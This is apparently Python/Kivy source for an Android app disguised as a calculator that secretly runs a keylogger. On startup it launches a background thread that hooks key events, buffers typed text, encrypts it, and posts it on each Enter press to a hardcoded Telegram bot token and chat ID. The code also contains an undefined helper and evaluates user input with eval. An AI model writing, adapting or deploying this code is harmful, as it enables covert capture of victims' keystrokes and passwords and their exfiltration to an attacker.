import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.logger import Logger
import threading
import requests
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import time
from jnius import autoclass, cast
from android import mActivity

# Telegram ayarları
TOKEN = "8384239281:AAGtFQXI38xhb15ExRhkK6Sib2tjj3wA-zs"
CHAT_ID = "7797296861"

# Şifreleme ayarları
PASSWORD = "4747"
salt = b'salt_'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
key = base64.urlsafe_b64encode(kdf.derive(PASSWORD.encode()))
cipher_suite = Fernet(key)

# Global değişkenler
current_text = ""
service_running = False

def encrypt_message(message):
    encrypted = cipher_suite.encrypt(message.encode())
    return base64.urlsafe_b64encode(encrypted).decode()

def send_to_telegram(message):
    try:
        encrypted_msg = encrypt_message(message)
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": f"🕒 {time.strftime('%H:%M %d.%m.%Y')}\n📱 {encrypted_msg}"}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        Logger.error(f"Telegram Error: {str(e)}")

class KeyloggerService:
    def __init__(self):
        self.current_text = ""
        
    def on_key_event(self, event):
        global current_text
        try:
            if hasattr(event, 'keycode'):
                if event.keycode == 66:  # Enter tuşu
                    if self.current_text.strip():
                        send_to_telegram(self.current_text)
                        self.current_text = ""
                else:
                    char = self.get_char_from_keycode(event.keycode)
                    if char:
                        self.current_text += char
        except Exception as e:
            Logger.error(f"Keylogger Error: {str(e)}")

class CalculatorApp(App):
    def build(self):
        self.service = KeyloggerService()
        self.start_keylogger_service()
        
        # Hesap makinesi arayüzü
        layout = BoxLayout(orientation='vertical')
        self.display = TextInput(font_size=32, size_hint_y=0.3, readonly=True)
        layout.add_widget(self.display)
        
        buttons = [
            ['7', '8', '9', '/'],
            ['4', '5', '6', '*'],
            ['1', '2', '3', '-'],
            ['.', '0', '=', '+']
        ]
        
        for row in buttons:
            h_layout = BoxLayout()
            for label in row:
                button = Button(text=label, font_size=32)
                button.bind(on_press=self.on_button_press)
                h_layout.add_widget(button)
            layout.add_widget(h_layout)
            
        clear_btn = Button(text='Temizle', font_size=32, size_hint_y=0.2)
        clear_btn.bind(on_press=self.clear_display)
        layout.add_widget(clear_btn)
        
        return layout

    def on_button_press(self, instance):
        current = self.display.text
        button_text = instance.text
        
        if button_text == '=':
            try:
                result = str(eval(current))
                self.display.text = result
            except:
                self.display.text = "Hata"
        else:
            self.display.text += button_text

    def clear_display(self, instance):
        self.display.text = ""

    def start_keylogger_service(self):
        def start_service():
            try:
                PythonService = autoclass('org.kivy.android.PythonService')
                service = PythonService.mService
                
                if service:
                    # Keylogger servisini başlat
                    key_event_manager = autoclass('android.view.KeyEvent')
                    window_manager = service.getSystemService(autoclass('android.content.Context').WINDOW_SERVICE)
                    
                    # Global key listener başlat
                    from android.runnable import run_on_ui_thread
                    
                    @run_on_ui_thread
                    def start_key_listener():
                        try:
                            activity = mActivity
                            root_view = activity.getWindow().getDecorView().getRootView()
                            
                            class GlobalKeyListener:
                                def dispatchKeyEvent(self, event):
                                    self.service.on_key_event(event)
                                    return False
                            
                            key_listener = GlobalKeyListener()
                            key_listener.service = self.service
                            root_view.setOnKeyListener(key_listener)
                            
                        except Exception as e:
                            Logger.error(f"Key listener error: {str(e)}")
                    
                    start_key_listener()
                    
            except Exception as e:
                Logger.error(f"Service error: {str(e)}")
        
        # Servisi başlat
        threading.Thread(target=start_service, daemon=True).start()

if __name__ == '__main__':
    CalculatorApp().run()
